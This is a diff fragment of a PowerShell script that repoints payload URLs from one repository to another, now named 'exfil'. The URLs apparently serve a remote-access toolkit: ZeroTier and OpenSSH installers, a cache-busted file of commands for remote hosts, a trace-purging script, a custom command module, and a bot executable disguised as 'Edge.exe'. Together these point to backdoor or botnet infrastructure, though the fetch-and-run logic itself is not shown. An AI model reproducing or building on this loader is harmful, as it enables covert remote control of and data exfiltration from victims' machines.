@@ -6,15 +6,15 @@ $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
 $retryAttempts = 5
 $cacheBuster = Get-Random
-$hashesUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/HashesOfCorePrograms.txt"
-$sshinstallzip = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/OpenSSHStuff/WorkingOpenSSHnstallFromZIP.ps1"
-$sshinstall = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
-$ztinstall = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZTInstall.ps1"
-$codeUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
-$purgescripturl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Sanitation/FullPurge.ps1"
-$ztnethandler = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"
-$customcmdsection = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/Miscellaneous/CustomCMDSection.ps1"
-$boturl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Edge.exe"
+$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
+$sshinstallzip = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/OpenSSHStuff/WorkingOpenSSHnstallFromZIP.ps1"
+$sshinstall = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
+$ztinstall = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZTInstall.ps1"
+$codeUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
+$purgescripturl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Sanitation/FullPurge.ps1"
+$ztnethandler = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"
+$customcmdsection = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/Miscellaneous/CustomCMDSection.ps1"
+$boturl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/Edge.exe"
 
 $ztdir = "C:\ProgramData\ZeroTier"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
